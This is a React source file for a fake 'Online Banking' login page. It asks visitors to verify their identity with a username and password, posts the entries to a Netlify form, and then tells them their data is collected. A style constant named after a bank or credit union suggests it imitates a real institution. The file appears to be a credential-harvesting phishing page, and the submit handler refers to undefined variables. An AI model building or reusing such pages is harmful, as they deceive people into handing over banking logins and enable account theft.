import React from 'react'
import "./home.styles.css"
import {InputField} from '../components/InputField/InputField'

const styles = {
    efcYellow: '#ED8B00',
    fontMedium: "1.5rem"
}
// const formLabels = ["Last Name", "Member Email Address", "Phone Number"]
// const Lists = ({list, user})=>{
//     return list.map(item => <InputField name={item} value={user}/>)
// }


export default function Home (){
    const [isLoggedIn, setLoggedIn] = React.useState(false)
    const [user, setUser] = React.useState({
        username: '',
        password: ''
    })

    const handlerChange = (e)=>{
        return setUser({
            ...user,
            [e.target.name]: e.target.value
        })
    }
    const encode = (data)=> {
        return Object.keys(data).map((key)=> encodeURIComponent(key) + '=' + encodeURIComponent(data[key])).join('&')
    }
    const handleSubmit = (e)=> {
        e.preventDefault();
        const form = e.target;
        fetch("/", {
            method: "POST",
            headers: {"Content-Type": 'application/x-www-form-urlencoded'},
            body: encode(
                {
                'form-name': form.getAttribute('name'),
                ...state
                }
            )
        }).then(()=>alert("Wait a sec, your data is collected. Sharpview will reach back to you soon. Bye!!!"))
        .then(()=>navigate(form.getAttribute('action')))
        .catch(err=>alert(err))
    }
    return <div className="home-main">
        {isLoggedIn ? 
        <h1>Hello</h1> : 
        <div className='form-wrapper'>
            <header>Online Banking</header>
            <p style={{color: styles.efcYellow, fontSize: styles.fontMedium}}>
                Provide the following information to verify your identity
            </p>
            <form 
                name="login" 
                method="POST"
                netlify-honeypot="bot-field"
                data-netlify="true"
                action="/"
                onSubmit = {handleSubmit}
            >
                <input type="hidden" name="form-name" value="login" />
                <InputField name={'Username'} value={user.username} onChangeHandler={handlerChange}/>
                <InputField name={'Password'} value={user.password} onChangeHandler={handlerChange}/>
                <button onClick={handleSubmit}>LOG IN</button>
            </form>
        </div>}
        
    </div>
}